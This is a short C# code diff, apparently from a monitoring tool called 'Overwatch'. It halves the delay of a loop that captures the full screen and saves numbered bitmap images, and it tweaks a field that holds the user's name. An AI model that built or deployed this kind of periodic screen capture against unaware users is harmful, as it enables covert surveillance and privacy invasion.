@@ -18,8 +18,8 @@ namespace Overwatch
         static appLog Log = new appLog();
         public int CountImage = 0;
         private static string subPath = "\\ImagesPath";
+        public static string UsersName;
 
-        static public string UsersName;
         public static void CreateAndUpdateDate(string text, string WayAndName) { System.IO.File.AppendAllText(WayAndName, text); }
         public static List<string> GetComputerUsers()
         {
@@ -50,7 +50,7 @@ namespace Overwatch
                     graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                     bmp.Save(appConfing.targetDirPath+subPath + String.Format("\\Image{0}.bmp", CountImage.ToString()));
                     CountImage++;
-                    System.Threading.Thread.Sleep(60000);
+                    System.Threading.Thread.Sleep(30000);
                 }
             }
             catch (Exception ex) { Log.Write(ex.Message, true); }
